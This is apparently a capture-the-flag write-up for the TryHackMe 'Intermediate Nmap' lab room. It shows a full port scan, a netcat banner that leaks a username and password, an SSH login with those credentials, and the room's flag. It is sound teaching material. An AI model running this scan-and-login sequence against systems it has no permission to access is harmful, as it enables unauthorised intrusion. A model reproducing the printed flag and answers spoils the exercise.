# TryHackMe — Intermediate Nmap (Writeup)

![Room title](https://github.com/Writeup-Challenge-Le-Nam-Thang/Try-Hack-Me/blob/0f4dfea42d636c9a19cb6f69a1c9da2ee477ce24/2.png)

## Overview

- **Room**: [Intermediate Nmap](https://tryhackme.com/room/intermediatenmap)
- **Difficulty**: Easy (Premium room)
- **Estimated time**: ~20 minutes
- **Objective**: Combine `nmap` skills with `netcat` and other protocols to log in to the target machine and retrieve the flag.

> The target VM is listening on a high port. Connecting to it may reveal information that can be used to connect to a lower port commonly used for remote access.

## Environment

- **AttackBox**: Kali Linux (TryHackMe)
- **Target IP**: `10.48.137.141`

## Step 1 — Port Scanning with Nmap

Scan all 65535 TCP ports to avoid missing any services:

```bash
nmap -p- 10.48.137.141
```

**Result:**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-14 09:52 -0400
Nmap scan report for 10.48.137.141
Host is up (0.098s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 245.04 seconds
```

Three notable ports:
| Port | Service |
|------|---------|
| 22   | ssh |
| 2222 | EtherNetIP-1 |
| 31337 | Elite |

Port `31337` ("Elite" / leet-speak) is an unusually high port — as hinted in the task description, this is likely where credential information is hidden.

## Step 2 — Connecting to the High Port with Netcat

```bash
nc 10.48.137.141 31337
```

The response reveals login credentials that were apparently left behind (possibly leaked by an admin):

```
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```

➡️ Username: `ubuntu`
➡️ Password: `Dafdas!!/str0ng`

## Step 3 — SSH into the Target

Using the credentials just obtained, SSH into port 22:

```bash
ssh ubuntu@10.48.137.141
```

```
The authenticity of host '10.48.137.141 (10.48.137.141)' can't be established.
ED25519 key fingerprint is SHA256:8VuYGtc5lO2sXK+MVsdbgQV9nF+EVHf8wJcrMAEWg10
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.137.141' (ED25519) to the list of known hosts.
ubuntu@10.48.137.141's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1014-aws x86_64)
```

Login successful!

## Step 4 — Grabbing the Flag

```bash
cd user
ls
cat flag.txt
```

**Result:**

```
flag{251f309497a18888dde5222761ea88e4}
```

## Summary

| Step | Tool | Purpose |
|------|------|---------|
| 1 | `nmap -p-` | Scan all TCP ports to discover running services |
| 2 | `netcat` | Connect to the high port (31337) to retrieve leaked credentials |
| 3 | `ssh` | Remote login using the harvested credentials |
| 4 | `cat` | Read the flag in the user's home directory |

### Key Takeaways

- Always scan the **full port range** (`-p-`) instead of just the default top 1000 ports, since sensitive information can be hidden on high ports that are easy to overlook.
- Services running on unusual ports (like 31337 — "Elite"/leet) are worth checking manually with `netcat`.
- Never expose credentials through a service banner or an open port — this is a serious real-world misconfiguration/operational security failure.

---
*This writeup was completed in TryHackMe's legal lab environment for educational purposes.*
